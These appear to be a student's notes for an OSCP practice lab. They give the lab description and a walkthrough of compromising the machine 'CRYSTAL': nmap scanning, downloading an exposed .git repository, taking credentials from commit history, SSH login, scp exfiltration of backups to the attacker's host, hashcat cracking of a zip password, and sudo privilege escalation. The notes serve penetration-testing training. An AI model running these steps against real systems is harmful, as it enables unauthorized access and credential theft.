# Questions 
This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP exam.

The challenge contains three machines that are connected via Active Directory, and three standalone machines that do not have any dependencies or intranet connections. All the standalone machines have a local.txt and a proof.txt, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together, and the entire domain must be compromised to achieve any points for it at all.

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

# 
sudo nmap -T4 -A 192.168.162.141-145
[ip-scanning.md]

# CRYSTAL
# Found there is a .git on the server. Lets download and find what can we find from the server
wget -r -np http://192.168.162.144/.git/

git show
...
diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
...

git log
# Found there is alot changes, 
git show 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
...
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "dean@challenge.pwk";
+    private $password = "BreakingBad92";
...
# Since we have both two credentials now lets try to access into the server
# Only 1 user manage to access it
ssh stuart@192.168.162.144 
cat local.txt

# In the opt/backup found sitebackup1.zip file
# Lets download to our local use scp
scp sitebackup*.zip kali@192.168.45.165:/home/kali/Desktop/OSCP-A

# For the sitebackup3.zip is encrypted, the rest is broken
# Lets extract the password and brute force it
zip2john sitebackup3.zip > sitebackup3.hash
hashcat --help | grep -i "zip"
  13600 | WinZip      | Archive
# References https://www.reddit.com/r/computerforensics/comments/9rezdi/help_cracking_zip_hash/?rdt=50409
code sitebackup3.hash
code zip.hash
hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt
...
codeblue                                             
Session..........: hashcat
Status...........: Cracked
...

[configuration.php]
	public $dbtype = 'mysql';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'Password@1';
	public $db = 'jooml';
	public $dbprefix = 'o83rl_';
    public $secret = 'Ee24zIK4cDhJHL4H';
	public $mailfrom = 'chloe@challenge.lab';
	public $fromname = 'Challenge Lab';
	public $sendmail = '/usr/sbin/sendmail';

# Receive the DB user joomla and chloe, lets try to su chloe
chloe@oscp:/opt/backup$ sudo -l
User chloe may run the following commands on oscp:
    (ALL : ALL) ALL
# Now we got the root user
root@oscp:~# cat proof.txt

# HERMES




